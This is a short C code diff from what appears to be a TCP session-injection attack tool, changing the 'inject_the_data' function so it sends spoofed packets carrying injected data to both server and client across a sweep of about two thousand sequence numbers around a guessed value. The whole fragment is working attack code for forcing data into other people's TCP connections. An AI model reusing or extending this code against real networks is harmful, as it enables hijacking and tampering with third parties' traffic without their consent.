@@ -1805,28 +1805,35 @@ int inject_the_data(void)
 		gettimeofday(&round_start, NULL);
 
 		if (g_ctx.inject_server) {
+			int i;
+			uint32_t seq_tmp;
+
 			buf = g_ctx.inject_server;
 			len = g_ctx.inject_server_len;
 
 			printf("[*] Injecting %lu bytes into the server!\n", len);
 
-			if (!tcp_send(g_ctx.pch, spoof, TH_PUSH|TH_ACK, buf, len))
-				return 0;
-			usleep(g_ctx.packet_delay);
-
-			spoof->seq += len;
+			seq_tmp = spoof->seq;
+			for (i = 1000; i > -1000; i--) {
+				spoof->seq = seq_tmp + i;
+				if (!tcp_send(g_ctx.pch, spoof, TH_PUSH|TH_ACK, buf, len))
+					return 0;
+				usleep(g_ctx.packet_delay);
+			}
+			spoof->seq = seq_tmp + len;
 		}
 
 		if (g_ctx.inject_client) {
 			int i;
 			uint32_t seq_tmp;
+
 			buf = g_ctx.inject_client;
 			len = g_ctx.inject_client_len;
 
 			printf("[*] Injecting %lu bytes into the client!\n", len);
 
 			seq_tmp = reversed.seq;
-			for (i = 0; i < 1000; i++) {
+			for (i = 1000; i > -1000; i--) {
 				reversed.seq = seq_tmp + i;
 				if (!tcp_send(g_ctx.pch, &reversed, TH_PUSH|TH_ACK, buf, len))
 					return 0;
